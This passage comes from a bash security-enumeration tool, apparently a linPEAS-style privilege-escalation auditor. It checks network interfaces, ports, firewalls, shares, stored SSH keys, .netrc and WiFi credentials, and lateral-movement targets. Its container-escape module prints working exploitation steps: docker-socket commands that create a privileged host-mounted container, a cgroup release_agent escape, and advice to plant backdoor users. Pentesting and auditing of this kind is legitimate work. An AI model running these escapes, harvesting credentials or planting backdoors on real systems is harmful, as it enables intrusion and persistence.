        else
          print_success " ${CYAN}$interface${NC}: No IPv4/IPv6 address [$state] [$mac]"
        fi

        # Check for promiscuous mode
        if ip -o link show "$interface" | grep -q "PROMISC"; then
          print_critical "   ${RED}→ Interface is in PROMISCUOUS mode! Possible network sniffing.${NC}"
        fi
      done
    else
      print_warning "No network interfaces found"
    fi
  elif command_exists ifconfig; then
    # Fallback to ifconfig
    interfaces=$(ifconfig | grep -E "^[a-zA-Z0-9]+" | awk '{print $1}' | tr -d ':')

    if [ -n "$interfaces" ]; then
      print_success "Found $(echo "$interfaces" | wc -l) network interfaces:"

      echo "$interfaces" | while read -r interface; do
        # Get IP address
        ip_addr=$(ifconfig "$interface" | grep -oP 'inet addr:\K\S+' 2>/dev/null || ifconfig "$interface" | grep -oP 'inet\s+\K\S+' 2>/dev/null)
        ip_addr6=$(ifconfig "$interface" | grep -oP 'inet6 addr:\K\S+' 2>/dev/null || ifconfig "$interface" | grep -oP 'inet6\s+\K\S+' 2>/dev/null | grep -v "fe80")

        # Get MAC address
        mac=$(ifconfig "$interface" | grep -oP 'HWaddr\s+\K\S+' 2>/dev/null || ifconfig "$interface" | grep -oP 'ether\s+\K\S+' 2>/dev/null)

        # Print interface info
        if [ -n "$ip_addr" ]; then
          print_success " ${CYAN}$interface${NC}: $ip_addr [$mac]"
        elif [ -n "$ip_addr6" ]; then
          print_success " ${CYAN}$interface${NC}: $ip_addr6 [$mac]"
        else
          print_success " ${CYAN}$interface${NC}: No IPv4/IPv6 address [$mac]"
        fi

        # Check for promiscuous mode
        if ifconfig "$interface" | grep -q "PROMISC"; then
          print_critical "   ${RED}→ Interface is in PROMISCUOUS mode! Possible network sniffing.${NC}"
        fi
      done
    else
      print_warning "No network interfaces found"
    fi
  else
    print_warning "Neither ip nor ifconfig commands are available"
  fi
}

check_listening_ports() {
  print_subtitle "Listening Ports"

  print_info "Checking for open ports and listening services..."

  # Check using ss command (preferred)
  if command_exists ss; then
    # Get listening TCP ports
    tcp_ports=$(ss -tlnp 2>/dev/null | grep -v "*:*" | grep "LISTEN")

    if [ -n "$tcp_ports" ]; then
      print_success "TCP ports listening for connections:"

      echo "$tcp_ports" | grep -v "127.0.0.1" | while read -r line; do
        local_address=$(echo "$line" | awk '{print $4}')
        process=$(echo "$line" | grep -oP 'users:\(\("\K[^"]+' | cut -d"," -f1)

        # Identify public-facing services
        if echo "$local_address" | grep -qv "127.0.0.1\|::1"; then
          port=$(echo "$local_address" | awk -F: '{print $NF}')

          # Check for dangerous ports
          case "$port" in
            22)
              print_critical " ${RED}SSH${NC} - ${RED}$local_address${NC} - $process"
              ;;
            445|139)
              print_critical " ${RED}SMB/Samba${NC} - ${RED}$local_address${NC} - $process"
              ;;
            3389)
              print_critical " ${RED}RDP${NC} - ${RED}$local_address${NC} - $process"
              ;;
            23)
              print_critical " ${RED}Telnet${NC} - ${RED}$local_address${NC} - $process"
              ;;
            *)
              print_warning " ${YELLOW}$local_address${NC} - $process"
              ;;
          esac
        else
          print_success " $local_address - $process"
        fi
      done
    else
      print_success "No TCP ports found listening for connections"
    fi

    # Get listening UDP ports
    udp_ports=$(ss -ulnp 2>/dev/null | grep -v "*:*")

    if [ -n "$udp_ports" ]; then
      print_success "UDP ports listening for connections:"

      echo "$udp_ports" | grep -v "127.0.0.1" | while read -r line; do
        local_address=$(echo "$line" | awk '{print $4}')
        process=$(echo "$line" | grep -oP 'users:\(\("\K[^"]+' | cut -d"," -f1)

        # Identify public-facing services
        if echo "$local_address" | grep -qv "127.0.0.1\|::1"; then
          port=$(echo "$local_address" | awk -F: '{print $NF}')

          # Check for dangerous ports
          case "$port" in
            53)
              print_warning " ${YELLOW}DNS${NC} - ${YELLOW}$local_address${NC} - $process"
              ;;
            161)
              print_warning " ${YELLOW}SNMP${NC} - ${YELLOW}$local_address${NC} - $process"
              ;;
            69)
              print_warning " ${YELLOW}TFTP${NC} - ${YELLOW}$local_address${NC} - $process"
              ;;
            *)
              print_success " $local_address - $process"
              ;;
          esac
        else
          print_success " $local_address - $process"
        fi
      done
    else
      print_success "No UDP ports found listening for connections"
    fi
  # Fallback to netstat
  elif command_exists netstat; then
    # Get listening TCP ports
    tcp_ports=$(netstat -tlnp 2>/dev/null | grep "LISTEN")

    if [ -n "$tcp_ports" ]; then
      print_success "TCP ports listening for connections:"

      echo "$tcp_ports" | grep -v "127.0.0.1" | while read -r line; do
        local_address=$(echo "$line" | awk '{print $4}')
        process=$(echo "$line" | awk '{for(i=7;i<=NF;i++) printf "%s ", $i}')

        # Identify public-facing services
        if echo "$local_address" | grep -qv "127.0.0.1\|::1"; then
          port=$(echo "$local_address" | awk -F: '{print $NF}')

          # Check for dangerous ports
          case "$port" in
            22)
              print_critical " ${RED}SSH${NC} - ${RED}$local_address${NC} - $process"
              ;;
            445|139)
              print_critical " ${RED}SMB/Samba${NC} - ${RED}$local_address${NC} - $process"
              ;;
            3389)
              print_critical " ${RED}RDP${NC} - ${RED}$local_address${NC} - $process"
              ;;
            23)
              print_critical " ${RED}Telnet${NC} - ${RED}$local_address${NC} - $process"
              ;;
            *)
              print_warning " ${YELLOW}$local_address${NC} - $process"
              ;;
          esac
        else
          print_success " $local_address - $process"
        fi
      done
    else
      print_success "No TCP ports found listening for connections"
    fi
  else
    print_warning "Neither ss nor netstat commands are available"
  fi
}

check_iptables_rules() {
  print_subtitle "Firewall Rules"

  print_info "Checking firewall configuration..."

  # Check iptables firewall
  if command_exists iptables && [ "$IAMROOT" ]; then
    iptables_rules=$(iptables -L -n 2>/dev/null)

    if [ -n "$iptables_rules" ]; then
      print_success "iptables firewall rules:"

      # Check for default policies
      input_policy=$(iptables -L INPUT -n 2>/dev/null | head -n 1 | awk '{print $4}')
      forward_policy=$(iptables -L FORWARD -n 2>/dev/null | head -n 1 | awk '{print $4}')
      output_policy=$(iptables -L OUTPUT -n 2>/dev/null | head -n 1 | awk '{print $4}')

      # Print policies with appropriate colors
      if [ "$input_policy" = "ACCEPT" ]; then
        print_warning " ${YELLOW}INPUT chain policy: $input_policy${NC}"
      else
        print_success " INPUT chain policy: $input_policy"
      fi

      if [ "$forward_policy" = "ACCEPT" ]; then
        print_warning " ${YELLOW}FORWARD chain policy: $forward_policy${NC}"
      else
        print_success " FORWARD chain policy: $forward_policy"
      fi

      if [ "$output_policy" = "ACCEPT" ]; then
        print_success " OUTPUT chain policy: $output_policy"
      else
        print_warning " ${YELLOW}OUTPUT chain policy: $output_policy${NC}"
      fi

      # Check for any REJECT/DROP rules for incoming SSH (port 22)
      ssh_blocked=$(iptables -L INPUT -n 2>/dev/null | grep -E "REJECT|DROP" | grep -E "dpt:22|ssh")
      if [ -n "$ssh_blocked" ]; then
        print_success " SSH (port 22) appears to be blocked by firewall rules"
      elif [ "$input_policy" != "DROP" ] && [ "$input_policy" != "REJECT" ]; then
        print_warning " ${YELLOW}No specific rules to block SSH (port 22) were found${NC}"
      fi

      # Check for empty ruleset
      rule_count=$(iptables -L -n 2>/dev/null | grep -E "ACCEPT|REJECT|DROP" | wc -l)
      if [ "$rule_count" -lt 3 ]; then
        print_warning " ${YELLOW}Very few firewall rules detected ($rule_count). This might be insecure.${NC}"
      else
        print_success " Total rules: $rule_count"
      fi
    else
      print_warning "iptables is available but no rules were retrieved (might need root privileges)"
    fi
  elif command_exists ufw; then
    # Check UFW status
    ufw_status=$(ufw status 2>/dev/null)

    if [ -n "$ufw_status" ]; then
      print_success "UFW firewall status:"

      # Check if UFW is active
      if echo "$ufw_status" | grep -q "Status: active"; then
        print_success " UFW is active"

        # Print any open ports
        open_ports=$(echo "$ufw_status" | grep "ALLOW" | grep -v "(v6)")
        if [ -n "$open_ports" ]; then
          print_warning " ${YELLOW}Open ports:${NC}"
          echo "$open_ports" | while read -r line; do
            print_warning " ${YELLOW}→ $line${NC}"

            # Check for dangerous open ports
            if echo "$line" | grep -qE "22/tcp|23/tcp|3389/tcp|445/tcp"; then
              print_critical "   ${RED}→ Security critical port is open to incoming connections!${NC}"
            fi
          done
        else
          print_success " No open ports detected in UFW rules"
        fi
      else
        print_warning " ${YELLOW}UFW is installed but not active${NC}"
      fi
    else
      print_warning "UFW is available but no status was retrieved (might need root privileges)"
    fi
  elif command_exists firewall-cmd; then
    # Check firewalld status
    firewalld_status=$(firewall-cmd --state 2>/dev/null)

    if [ "$firewalld_status" = "running" ]; then
      print_success "firewalld is active"

      # Get default zone
      default_zone=$(firewall-cmd --get-default-zone 2>/dev/null)
      print_success " Default zone: $default_zone"

      # List open ports in default zone
      open_ports=$(firewall-cmd --zone="$default_zone" --list-ports 2>/dev/null)
      if [ -n "$open_ports" ]; then
        print_warning " ${YELLOW}Open ports in $default_zone zone:${NC}"

        # Check for dangerous open ports
        for port in $open_ports; do
          print_warning " ${YELLOW}→ $port${NC}"

          if [[ "$port" =~ ^(22|23|3389|445)/ ]]; then
            print_critical "   ${RED}→ Security critical port is open to incoming connections!${NC}"
          fi
        done
      else
        print_success " No open ports detected in $default_zone zone"
      fi
    else
      print_warning " ${YELLOW}firewalld is installed but not active${NC}"
    fi
  else
    print_warning "No supported firewall (iptables, ufw, firewalld) detected"
  fi
}

check_network_shares() {
  print_subtitle "Network Shares"

  print_info "Checking for shared network resources..."

  # Check for NFS exports
  if [ -f /etc/exports ]; then
    nfs_shares=$(grep -v "^#" /etc/exports 2>/dev/null | grep -v "^$")

    if [ -n "$nfs_shares" ]; then
      print_warning "NFS shares exported to the network:"

      echo "$nfs_shares" | while read -r line; do
        print_warning " ${YELLOW}→ $line${NC}"

        # Check for dangerous NFS options
        if echo "$line" | grep -qE "no_root_squash|no_all_squash"; then
          print_critical "   ${RED}→ This NFS share has dangerous options (no_root_squash)!${NC}"
          print_critical "   ${RED}→ Remote root users can create files as root on this system.${NC}"
        fi
      done
    else
      print_success "No NFS shares found"
    fi
  fi

  # Check for Samba shares
  if [ -f /etc/samba/smb.conf ]; then
    samba_shares=$(grep -E "^\s*\[.*\]" /etc/samba/smb.conf 2>/dev/null | grep -v "\[global\]")

    if [ -n "$samba_shares" ]; then
      print_warning "Samba shares available on the network:"

      echo "$samba_shares" | while read -r line; do
        share_name=$(echo "$line" | tr -d '[]')
        print_warning " ${YELLOW}→ $share_name${NC}"

        # Get share path and permissions
        path=$(grep -A 20 "^\s*\[$share_name\]" /etc/samba/smb.conf | grep "path" | head -n 1 | awk -F= '{print $2}' | tr -d ' ')
        writable=$(grep -A 20 "^\s*\[$share_name\]" /etc/samba/smb.conf | grep -E "writable|writeable" | head -n 1)
        guest_ok=$(grep -A 20 "^\s*\[$share_name\]" /etc/samba/smb.conf | grep "guest ok" | head -n 1)

        if [ -n "$path" ]; then
          print_warning "   ${YELLOW}→ Path: $path${NC}"

          # Check for dangerous Samba configurations
          if echo "$writable" | grep -q "yes"; then
            print_warning "   ${YELLOW}→ Share is writable${NC}"
          fi

          if echo "$guest_ok" | grep -q "yes"; then
            print_critical "   ${RED}→ Guest access is allowed!${NC}"
          fi
        fi
      done
    else
      print_success "No Samba shares found"
    fi
  fi

  # Check for mounted network shares
  mounted_shares=$(mount | grep -E "nfs|cifs|smb")

  if [ -n "$mounted_shares" ]; then
    print_warning "Mounted network shares:"

    echo "$mounted_shares" | while read -r line; do
      print_warning " ${YELLOW}→ $line${NC}"
    done
  else
    print_success "No mounted network shares found"
  fi
}

check_network_credentials() {
  print_subtitle "Network Credentials"

  print_info "Checking for stored network credentials..."

  # Check for SSH keys
  if [ -d "$HOME/.ssh" ]; then
    ssh_files=$(find "$HOME/.ssh" -type f -name "id_*" 2>/dev/null)

    if [ -n "$ssh_files" ]; then
      print_warning "SSH keys found:"

      echo "$ssh_files" | while read -r key; do
        # Check key permissions
        key_perms=$(ls -la "$key" | awk '{print $1}')

        if [[ "$key_perms" =~ [g|o][r|w|x] ]]; then
          print_critical " ${RED}→ $key${NC} [$key_perms] (Bad permissions!)"
        else
          print_warning " ${YELLOW}→ $key${NC} [$key_perms]"
        fi

        # Check if key is encrypted
        if [[ "$key" != *.pub ]] && grep -q "ENCRYPTED" "$key" 2>/dev/null; then
          print_success "   → Key is encrypted with a passphrase"
        elif [[ "$key" != *.pub ]]; then
          print_critical "   ${RED}→ Key is NOT encrypted with a passphrase!${NC}"
        fi
      done
    else
      print_success "No SSH keys found"
    fi
  fi

  # Check SSH authorized_keys
  if [ -f "$HOME/.ssh/authorized_keys" ]; then
    authorized_keys=$(cat "$HOME/.ssh/authorized_keys" 2>/dev/null | grep -v "^#" | grep -v "^$")

    if [ -n "$authorized_keys" ]; then
      print_warning "SSH authorized_keys entries:"

      echo "$authorized_keys" | wc -l | xargs -I{} print_warning " ${YELLOW}→ {} keys found${NC}"

      # Check permissions
      auth_perms=$(ls -la "$HOME/.ssh/authorized_keys" | awk '{print $1}')
      if [[ "$auth_perms" =~ [g|o][r|w|x] ]]; then
        print_critical " ${RED}→ Bad permissions on authorized_keys file: $auth_perms${NC}"
      fi
    else
      print_success "No SSH authorized_keys entries found"
    fi
  fi

  # Check for .netrc file
  if [ -f "$HOME/.netrc" ]; then
    netrc_perms=$(ls -la "$HOME/.netrc" | awk '{print $1}')

    print_critical "${RED}→ .netrc file found: $HOME/.netrc${NC}"
    print_critical " ${RED}→ This file may contain cleartext credentials for FTP/remote services${NC}"

    if [[ "$netrc_perms" =~ [g|o][r|w|x] ]]; then
      print_critical " ${RED}→ Bad permissions: $netrc_perms${NC}"
    fi
  fi

  # Check for WPA/WiFi credentials
  if [ -d "/etc/NetworkManager/system-connections" ] && [ "$IAMROOT" ]; then
    wifi_conns=$(find /etc/NetworkManager/system-connections -type f 2>/dev/null)

    if [ -n "$wifi_conns" ]; then
      print_warning "WiFi connection profiles found:"

      echo "$wifi_conns" | while read -r conn; do
        ssid=$(grep -i "ssid=" "$conn" 2>/dev/null | cut -d= -f2)
        if [ -n "$ssid" ]; then
          print_warning " ${YELLOW}→ $conn${NC} (SSID: $ssid)"

          # Look for PSK
          if grep -i "psk=" "$conn" 2>/dev/null; then
            print_critical "   ${RED}→ Contains WiFi password!${NC}"
          fi
        fi
      done
    else
      print_success "No NetworkManager WiFi connections found"
    fi
  fi
}

check_potential_pivoting() {
  print_subtitle "Lateral Movement Potential"

  print_info "Checking for potential pivoting/lateral movement vectors..."

  # Check for hosts.equiv file
  if [ -f "/etc/hosts.equiv" ]; then
    hosts_equiv=$(cat "/etc/hosts.equiv" 2>/dev/null)

    if [ -n "$hosts_equiv" ]; then
      print_critical "${RED}hosts.equiv file found! This can allow remote logins without passwords:${NC}"

      echo "$hosts_equiv" | while read -r line; do
        print_critical " ${RED}→ $line${NC}"
      done
    fi
  fi

  # Check for .rhosts file
  rhosts_files=$(find / -name ".rhosts" 2>/dev/null)

  if [ -n "$rhosts_files" ]; then
    print_critical "${RED}.rhosts files found! These can allow remote logins without passwords:${NC}"

    echo "$rhosts_files" | while read -r file; do
      print_critical " ${RED}→ $file${NC}"

      if [ -r "$file" ]; then
        content=$(cat "$file" 2>/dev/null)
        if [ -n "$content" ]; then
          echo "$content" | while read -r line; do
            print_critical "   ${RED}→ $line${NC}"
          done
        fi
      fi
    done
  fi

  # Check for obviously shared SSH keys (same key on multiple systems)
  if [ -d "$HOME/.ssh" ]; then
    # Look for comments indicating shared keys
    shared_comments=$(find "$HOME/.ssh" -name "id_*" -exec grep -l "shared\|deploy\|ansible\|puppet\|automation" {} \; 2>/dev/null)

    if [ -n "$shared_comments" ]; then
      print_critical "${RED}Potentially shared SSH keys found:${NC}"

      echo "$shared_comments" | while read -r key; do
        print_critical " ${RED}→ $key${NC}"
        grep -i "shared\|deploy\|ansible\|puppet\|automation" "$key" | while read -r line; do
          print_critical "   ${RED}→ $line${NC}"
        done
      done
    fi
  fi

  # Check for pre-configured SSH hosts
  if [ -f "$HOME/.ssh/config" ]; then
    ssh_config=$(cat "$HOME/.ssh/config" 2>/dev/null)

    if [ -n "$ssh_config" ]; then
      print_warning "SSH client configuration found with potential pivot targets:"

      grep -i "^host " "$HOME/.ssh/config" | while read -r line; do
        print_warning " ${YELLOW}→ $line${NC}"
      done
    fi
  fi

  # Check for stored credentials in .ssh/known_hosts
  if [ -f "$HOME/.ssh/known_hosts" ]; then
    known_hosts_count=$(wc -l < "$HOME/.ssh/known_hosts")

    if [ "$known_hosts_count" -gt 0 ]; then
      print_warning "SSH known_hosts file contains $known_hosts_count entries"
      print_warning " ${YELLOW}→ These are potential lateral movement targets${NC}"

      # Check for non-hashed entries
      if grep -v "^|" "$HOME/.ssh/known_hosts" > /dev/null 2>&1; then
        print_critical " ${RED}→ known_hosts contains non-hashed entries that reveal hostnames/IPs${NC}"

        if [ "$THOROUGH" ]; then
          print_warning " ${YELLOW}→ Sample of reachable hosts:${NC}"
          grep -v "^|" "$HOME/.ssh/known_hosts" | cut -d" " -f1 | cut -d, -f1 | head -5 | while read -r host; do
            print_warning "   ${YELLOW}→ $host${NC}"
          done
        fi
      fi
    else
      print_success "No SSH known_hosts entries found"
    fi
  fi
}

# Main function to run all network checks
network_checks() {
  print_title "Network Information and Vulnerabilities"

  # Run all network security checks
  check_network_interfaces
  check_listening_ports
  check_iptables_rules
  check_network_shares
  check_network_credentials
  check_potential_pivoting

  # Wait for user if wait mode is enabled
  wait_for_user
}
# --- modules/container_checks/container_escape.sh ---

# Title: Container Escape Techniques
# Description: Advanced checks for container escape vectors and misconfigurations
# Author: Jonas Resch

# Check for container escape vectors via mounted host filesystems
check_mounted_filesystems() {
  print_subtitle "Mounted Host Filesystems"

  print_info "Checking for mounted host filesystems that could allow container escape..."

  # Check if we're in a container
  if [ ! -f /.dockerenv ] && ! grep -q "docker\|lxc\|kubepods" /proc/1/cgroup 2>/dev/null; then
    print_success "Not running in a container, skipping check"
    return
  fi

  # Check for mount points that might allow escape
  dangerous_mounts=()

  # Check /proc mount
  proc_mount=$(grep "/proc" /proc/mounts | head -n1)
  if [ -n "$proc_mount" ] && ! echo "$proc_mount" | grep -q "proc"; then
    dangerous_mounts+=("${RED}Host /proc is mounted: $proc_mount${NC}")
  fi

  # Check for host filesystem mounts
  host_mounts=$(grep -v "proc\|tmpfs\|cgroup\|sysfs\|devpts" /proc/mounts | grep -v "^overlay" | grep "/ ")
  if [ -n "$host_mounts" ]; then
    dangerous_mounts+=("${RED}Host root filesystem appears to be mounted: $host_mounts${NC}")
  fi

  # Check for docker socket mount
  if [ -e /var/run/docker.sock ]; then
    dangerous_mounts+=("${RED}Docker socket is mounted: /var/run/docker.sock${NC}")
  fi

  # Check for other suspicious mounts
  suspicious_dirs=("/host" "/var/lib/docker" "/var/lib/kubelet" "/var/run/docker" "/var/run/crio" "/var/lib/containerd")
  for dir in "${suspicious_dirs[@]}"; do
    if [ -d "$dir" ] && [ -r "$dir" ]; then
      dangerous_mounts+=("${RED}Suspicious directory mounted: $dir${NC}")
    fi
  done

  # Report findings
  if [ ${#dangerous_mounts[@]} -gt 0 ]; then
    print_critical "${RED}Found potential escape vectors via mounted filesystems:${NC}"
    for mount in "${dangerous_mounts[@]}"; do
      print_critical " ${RED}→ $mount${NC}"
    done

    print_critical "${RED}Exploitation guidance:${NC}"
    if [ -e /var/run/docker.sock ]; then
      print_critical " ${RED}→ Docker socket escape:${NC}"
      print_critical "   ${RED}curl -s --unix-socket /var/run/docker.sock http://localhost/images/json${NC}"
      print_critical "   ${RED}curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json${NC}"
      print_critical "   ${RED}→ Create a privileged container to escape:${NC}"
      print_critical "   ${RED}curl -s -X POST --unix-socket /var/run/docker.sock -H \"Content-Type: application/json\" http://localhost/containers/create?name=escape -d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\"],\"Binds\":[\"/:/host\"],\"Privileged\":true}'${NC}"
      print_critical "   ${RED}curl -s -X POST --unix-socket /var/run/docker.sock http://localhost/containers/escape/start${NC}"
      print_critical "   ${RED}curl -s -X POST --unix-socket /var/run/docker.sock http://localhost/containers/escape/attach?stderr=1&stdin=1&stdout=1&stream=1${NC}"
    elif [ -n "$host_mounts" ]; then
      print_critical " ${RED}→ Host filesystem is mounted, you may be able to access host files directly${NC}"
      print_critical "   ${RED}→ Look for SSH keys, config files, and sensitive data${NC}"
      print_critical "   ${RED}→ Try to add a backdoor user to /etc/passwd or SSH authorized_keys${NC}"
    fi
  else
    print_success "No obvious filesystem escape vectors found"
  fi
}

# Check capabilities that may allow container escape
check_dangerous_capabilities() {
  print_subtitle "Dangerous Capabilities"

  print_info "Checking for capabilities that could allow container escape..."

  # Check if we're in a container
  if [ ! -f /.dockerenv ] && ! grep -q "docker\|lxc\|kubepods" /proc/1/cgroup 2>/dev/null; then
    print_success "Not running in a container, skipping check"
    return
  fi

  # Define dangerous capabilities and their exploitation methods
  declare -A cap_exploits
  cap_exploits["cap_sys_admin"]="Mount filesystems, perform privileged operations"
  cap_exploits["cap_sys_ptrace"]="Attach to host processes, read memory"
  cap_exploits["cap_sys_module"]="Load kernel modules"
  cap_exploits["cap_sys_rawio"]="Direct I/O access, potentially access disk devices"
  cap_exploits["cap_sys_time"]="Change system time"
  cap_exploits["cap_net_admin"]="Configure network, potentially sniff traffic"
  cap_exploits["cap_dac_override"]="Bypass file permission checks"
  cap_exploits["cap_dac_read_search"]="Bypass file read permission checks"
  cap_exploits["cap_chown"]="Change file ownership"
  cap_exploits["cap_setuid"]="Set UID, run as other users"
  cap_exploits["cap_setgid"]="Set GID, run as other groups"
  cap_exploits["cap_setfcap"]="Set file capabilities"

  # Get current capabilities
  if command_exists capsh; then
    caps=$(capsh --print 2>/dev/null)

    # More reliable way to check for specific capabilities
    found_dangerous=0

    for cap in "${!cap_exploits[@]}"; do
      # Simple string match against capsh output to see if the capability is present
      if echo "$caps" | grep -q "$cap"; then
        found_dangerous=1
        print_critical "${RED}Container has dangerous capability: $cap${NC}"
        print_critical " ${RED}→ Potential impact: ${cap_exploits[$cap]}${NC}"

        # Specific exploitation guidance for each capability
        case "$cap" in
          "cap_sys_admin")
            print_critical " ${RED}→ Exploitation method:${NC}"
            print_critical "   ${RED}# Mount host filesystem and access it${NC}"
            print_critical "   ${RED}mkdir -p /tmp/escape${NC}"
            print_critical "   ${RED}mount -t proc proc /proc # If not already mounted${NC}"
            print_critical "   ${RED}cd /tmp/escape${NC}"
            print_critical "   ${RED}mount -t cgroup -o memory cgroup /tmp/escape${NC}"
            print_critical "   ${RED}mkdir -p payload${NC}"
            print_critical "   ${RED}echo 1 > payload/notify_on_release${NC}"
            print_critical "   ${RED}echo \"$\$\" > payload/release_agent${NC}"
            print_critical "   ${RED}echo '#!/bin/sh' > /tmp/payload.sh${NC}"
            print_critical "   ${RED}echo 'ps aux > /tmp/payload-output' >> /tmp/payload.sh${NC}"
            print_critical "   ${RED}chmod +x /tmp/payload.sh${NC}"
            print_critical "   ${RED}# Trigger the exploit${NC}"
            print_critical "   ${RED}sh -c \"echo \\\$\\\$ > payload/cgroup.procs\"${NC}"
            ;;
          "cap_sys_ptrace")
            print_critical " ${RED}→ Exploitation method:${NC}"
            print_critical "   ${RED}# Use ptrace to attach to host processes${NC}"
            print_critical "   ${RED}ps -ef # Look for host processes${NC}"
            print_critical "   ${RED}gdb -p PID # Attach to a process${NC}"
            ;;
          "cap_sys_module")
            print_critical " ${RED}→ Exploitation method:${NC}"
            print_critical "   ${RED}# Load a kernel module to gain root access${NC}"
            print_critical "   ${RED}echo 'int init_module() { return 0; }' > module.c${NC}"
            print_critical "   ${RED}echo 'void cleanup_module() { }' >> module.c${NC}"
            print_critical "   ${RED}# Compile and insmod the module${NC}"
            ;;
        esac
      fi
    done

    if [ $found_dangerous -eq 0 ]; then
      print_success "No dangerous capabilities found"
    fi
  elif [ -r /proc/self/status ]; then
    # Alternative method if capsh isn't available
    cap_eff=$(grep -i "^CapEff:" /proc/self/status 2>/dev/null | cut -f2)

    if [ -n "$cap_eff" ]; then
      # Check for dangerous capabilities using bit positions
      # Using a more reliable method that handles 64-bit integers

      found_dangerous=0

      # Map of capability bit positions
      # Based on linux/include/uapi/linux/capability.h
      declare -A cap_bits
      cap_bits["cap_sys_admin"]=21
      cap_bits["cap_sys_ptrace"]=19
      cap_bits["cap_sys_module"]=16
      cap_bits["cap_sys_rawio"]=17
      cap_bits["cap_sys_time"]=25
      cap_bits["cap_net_admin"]=12
      cap_bits["cap_dac_override"]=1
      cap_bits["cap_dac_read_search"]=2
      cap_bits["cap_chown"]=0
      cap_bits["cap_setuid"]=7
      cap_bits["cap_setgid"]=6
      cap_bits["cap_setfcap"]=31

      # Convert hex to binary for easier bit checking
      cap_bin=$(echo "ibase=16; obase=2; ${cap_eff^^}" | bc 2>/dev/null)

      if [ -n "$cap_bin" ]; then
        # Pad with leading zeros to ensure proper bit positions
        cap_bin=$(printf "%064s" "$cap_bin" | tr ' ' '0')

        for cap in "${!cap_bits[@]}"; do
          bit_pos=${cap_bits[$cap]}
          # Calculate the correct bit position from the right
          check_pos=$((${#cap_bin} - bit_pos - 1))

          # Check if the bit is set (1)
          if [ $check_pos -ge 0 ] && [ "${cap_bin:$check_pos:1}" = "1" ]; then
            found_dangerous=1
            print_critical "${RED}Container has dangerous capability: $cap${NC}"
            print_critical " ${RED}→ Potential impact: ${cap_exploits[$cap]}${NC}"
          fi
        done
      else
        # Fallback if bc is not available
        print_warning "${YELLOW}Container has capabilities, but can't decode them (bc not available)${NC}"
        print_warning " ${YELLOW}→ CapEff: $cap_eff${NC}"

        # Simple pattern-based checks for critical capability bits
        if [ "$cap_eff" != "0000000000000000" ] && [ "$cap_eff" != "0" ]; then
          # Check for common known patterns that indicate dangerous capabilities
          if [[ "$cap_eff" == *"0000001f"* ]] || [[ "$cap_eff" == *"ffffffff"* ]]; then
            print_critical "${RED}Container likely has dangerous capabilities (based on capability mask)${NC}"
          fi
        fi
      fi

      if [ $found_dangerous -eq 0 ]; then
        print_success "No dangerous capabilities found"
      fi
    else
      print_warning "Could not determine container capabilities"
    fi
  else
    print_warning "Could not determine container capabilities"
  fi
}

# Check for kernel modules that could be used for escape
check_kernel_modules() {
  print_subtitle "Kernel Module Escape"

  print_info "Checking for kernel modules that could be exploited..."

  # Check if we're in a container
  if [ ! -f /.dockerenv ] && ! grep -q "docker\|lxc\|kubepods" /proc/1/cgroup 2>/dev/null; then
    print_success "Not running in a container, skipping check"
    return
  fi

  # Check if we have access to /proc
  if [ ! -r /proc/modules ]; then
    print_warning "Cannot access /proc/modules, skipping kernel module check"
    return
  fi

  # Dangerous modules that could be exploited
  dangerous_modules=("nf_nat" "xt_MASQUERADE" "overlay" "kvm" "vboxdrv" "vboxnetflt")

  # Check loaded modules
  loaded_dangerous=()

  for module in "${dangerous_modules[@]}"; do
    if grep -q "^$module " /proc/modules 2>/dev/null; then
      loaded_dangerous+=("$module")
    fi
  done

  # Report findings
  if [ ${#loaded_dangerous[@]} -gt 0 ]; then
    print_warning "${YELLOW}Found potentially exploitable kernel modules:${NC}"
    for module in "${loaded_dangerous[@]}"; do
      print_warning " ${YELLOW}→ $module${NC}"
    done

    # Specific exploitation advice for some modules
    for module in "${loaded_dangerous[@]}"; do
      case "$module" in
        "overlay")
          print_critical " ${RED}→ overlay module exploitation:${NC}"
          print_critical "   ${RED}This module has had multiple vulnerabilities that allow container escape${NC}"
          print_critical "   ${RED}Check for CVE-2021-30465, CVE-2021-3178${NC}"
          ;;
        "nf_nat" | "xt_MASQUERADE")
          print_warning " ${YELLOW}→ Networking modules might allow for network manipulation${NC}"
          ;;
      esac
    done
  else
    print_success "No obviously exploitable kernel modules found"
  fi
}

# Check for cgroup release_agent exploitation method
check_cgroup_escape() {
  print_subtitle "CGroup Release_Agent Escape"

  print_info "Checking for cgroup release_agent escape vector..."

  # Check if we're in a container
  if [ ! -f /.dockerenv ] && ! grep -q "docker\|lxc\|kubepods" /proc/1/cgroup 2>/dev/null; then
    print_success "Not running in a container, skipping check"
    return
  fi

  # Check for CGROUPs mount with memory controller
  cgroup_mount=$(grep "cgroup" /proc/mounts | grep -E "memory|devices|freezer" | head -n1)

  if [ -n "$cgroup_mount" ]; then
    cgroup_path=$(echo "$cgroup_mount" | awk '{print $2}')

    if [ -d "$cgroup_path" ] && [ -w "$cgroup_path" ]; then
      print_critical "${RED}Writable cgroup mount point found: $cgroup_path${NC}"
      print_critical " ${RED}→ This might be exploitable for container escape via release_agent${NC}"
      print_critical " ${RED}→ Exploitation steps:${NC}"
      print_critical "   ${RED}mkdir -p $cgroup_path/payload${NC}"
      print_critical "   ${RED}echo 1 > $cgroup_path/payload/notify_on_release${NC}"
      print_critical "   ${RED}host_path=\$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)${NC}"
      print_critical "   ${RED}echo \"\$host_path/cmd\" > $cgroup_path/release_agent${NC}"
      print_critical "   ${RED}echo '#!/bin/sh' > /cmd${NC}"
      print_critical "   ${RED}echo 'ps > /output' >> /cmd${NC}"
      print_critical "   ${RED}chmod +x /cmd${NC}"
      print_critical "   ${RED}sh -c \"echo \$\$ > $cgroup_path/payload/cgroup.procs\"${NC}"
      return
    fi
  fi

  # Alternative check - try to write to memory subsystem
  if [ -d "/sys/fs/cgroup/memory" ]; then
    if [ -w "/sys/fs/cgroup/memory" ]; then
      print_critical "${RED}Writable cgroup memory subsystem found: /sys/fs/cgroup/memory${NC}"
      print_critical " ${RED}→ This might be exploitable for container escape via release_agent${NC}"
      return
    fi
  fi

  print_success "No exploitable cgroup configuration found"
}

# Check for CVE-2019-5736 (runc vulnerability)
check_runc_exploit() {
  print_subtitle "RunC Vulnerability (CVE-2019-5736)"

  print_info "Checking for indicators of CVE-2019-5736 runc vulnerability..."

  # Check if we're in a container
